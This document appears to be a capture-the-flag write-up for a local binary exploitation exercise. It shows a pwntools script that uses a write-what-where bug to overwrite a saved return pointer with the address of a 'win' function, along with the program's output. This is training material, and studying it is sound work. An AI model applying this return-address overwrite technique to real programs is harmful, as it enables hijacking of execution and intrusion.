# 09_www_ret Writeup

## Steps:
1. Run chall. This is very similar to 08 but the goal is to change the return pointer to a funciton `win`
```
$ ./chall 

Your goal is to modify the return pointer @ 0x7ffe2ca55728, to a function called 'win' in the binary.

This exercises is similar to the previous. You will notice a canary, but shouldn't have to worry about it!

0x7ffe2ca556f0: 0x0000000000000000 0x0000000000000000 
0x7ffe2ca55700: 0x0000000000000000 0x0000000000000000 
0x7ffe2ca55710: 0x0000000000000000 0x91c7c5ee1076f400 
0x7ffe2ca55720: 0x0000000000000001 0x00007fa1d9df0ca8 

What would you like to write? AAAA
Where would you like to write it? AAAA
zsh: segmentation fault  ./chall
```
2. Use gdb gef to identify the address of `win` with `info fun win`

```
0x0000000000401606  win
```

3. Write the payloads. This is almost exactly the same as 08 just different `what`.
   
   what -  `0x401606` converted to an `int` then `str`
   
   where - address in hex converted to an `int` then `str`
```
from pwn import *

target = process('./chall')

val = int("0x00401606", 16)
target.recvuntil(b"pointer @ ")
addr  = target.recvuntil(b",", False)[:-1]
addr = int(addr, 16)

target.sendline(str(val))
target.sendline(str(addr))

s = target.recvall().decode()
print(s)
```

## Solution:
```
$ python3 exploit.py
[+] Starting local process './chall': pid 130911
/home/kali/Binex-Writeups/binex_tuts/09_www_ret/exploit.py:13: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  target.sendline(str(val))
/home/kali/Binex-Writeups/binex_tuts/09_www_ret/exploit.py:14: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  target.sendline(str(addr))
[+] Receiving all data: Done (874B)
[*] Process './chall' stopped with exit code 0 (pid 130911)
 to a function called 'win' in the binary.

This exercises is similar to the previous. You will notice a canary, but shouldn't have to worry about it!

0x7ffd722c2810: 0x0000000000000000 0x0000000000000000 
0x7ffd722c2820: 0x0000000000000000 0x0000000000000000 
0x7ffd722c2830: 0x0000000000000000 0x42e12434689ed600 
0x7ffd722c2840: 0x0000000000000001 0x00007fa2b828dca8 

What would you like to write? Where would you like to write it? 
0x7ffd722c2810: 0x3135363237303431 0x0a30363939343938 
0x7ffd722c2820: 0x0000000000000000 0x0000000000000000 
0x7ffd722c2830: 0x0000000000000000 0x42e12434689ed600 
0x7ffd722c2840: 0x0000000000000001 0x0000000000401606 

Congrats, you successuly changed execution flow!
```
